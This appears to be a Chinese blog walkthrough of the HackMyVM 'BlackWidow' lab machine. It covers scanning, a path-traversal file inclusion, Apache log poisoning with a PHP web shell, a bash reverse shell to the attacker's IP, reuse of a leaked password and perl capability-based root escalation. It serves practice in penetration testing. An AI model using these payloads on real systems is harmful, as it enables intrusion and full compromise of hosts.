@@ -1,0 +1,271 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WxZGm0zi8zDd5K3kHZrjKw)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 71篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUscyU8EzyQicenObwiaD42v3AJkNjx0qCwPlUBBUNqzvE3l5L0nGeWtj3WLUBRI2rP2c6bkFKDKbcmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=BlackWidow  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: BlackWidow
+
+难度: 困难
+
+发布时间: 2021年5月7日
+
+提示信息:
+
+```
+靶机第一次启动没成功，重新启动后可以正常访问
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo arp-scan -I eth1 10.0.0.0/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.129
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.129 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到多个开放端口，先来看看80端口
+
+Web渗透
+-----
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后只有一张图片，做个目录扫描检查敏感url
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.129 -x php,txt,html
+```
+
+  
+
+扫描到/company目录，访问看看
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+源码中找到了一个链接，按照这个链接我们需要绑定域名，先来绑定域名再访问这个链接
+
+```
+sudo vi /etc/hosts
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+对company目录作个扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.129/company -x php,txt,html
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+仍然只有started.php这个动态页面，访问看看
+
+```
+http://blackwidow/company/started.php
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+源码中发现提示，正在开发使用file做为参数的php包含方法（后面发现index.php中也有这个提示，只是没太注意忽略了）
+
+手动检测这个参数
+
+```
+http://blackwidow/company/started.php?file=/etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+没有返回，继续测试
+
+```
+http://blackwidow/company/started.php?file=../../../../../../../../../../../../../etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+匹配路径成功，拿到passwd文件。发现viper用户，继续收集敏感信息，nmap扫描时显示中间件为apache我们找找日志
+
+```
+http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以修改agent写入一句话木马，再通过文件包含执行命令
+
+```
+curl -A '<?php system($_GET[shell]); ?>' http://blackwidow/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=id
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+写入成功，修改payload反弹shell到攻击机上
+
+1。攻击机监听4444端口
+
+```
+rlwrap nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。反弹shell，payload部分需要url编码
+
+编码前
+
+```
+http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=bash -c 'bash -i >& /dev/tcp/10.0.0.3/4444 0>&1'
+```
+
+编码后
+
+```
+http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=bash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.0.0.3%2f4444%200%3e%261'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，找找敏感信息
+
+```
+cd /var/backups  
+ls  
+cat auth.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到viper的密码，登录SSH验证
+
+```
+ssh viper@10.0.0.129
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，继续查找敏感信息。
+
+```
+cd /home/viper  
+ls  
+cat local.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到flag文件local.txt，上传辅助脚本检查
+
+1。攻击机上辅助脚本目录下开启HTTP服务
+
+```
+python3 -m http.server
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。靶机下载linpeas.sh并执行(靶机上没有wget，使用curl)
+
+```
+curl http://10.0.0.3:8000/linpeas.sh -o linpeas.sh
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到arsenic文件有CAP_SETUID能力，看看他有什么功能
+
+```
+cd backup_site/assets/vendor/weapon/  
+./arsenic -h
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+是perl程序，来看看如何提权
+
+```
+https://gtfobins.github.io/gtfobins/perl/#capabilities
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+知道如何提权，来验证一下
+
+```
+./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，找一下flag
+
+```
+cd /root  
+ls  
+cat root.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
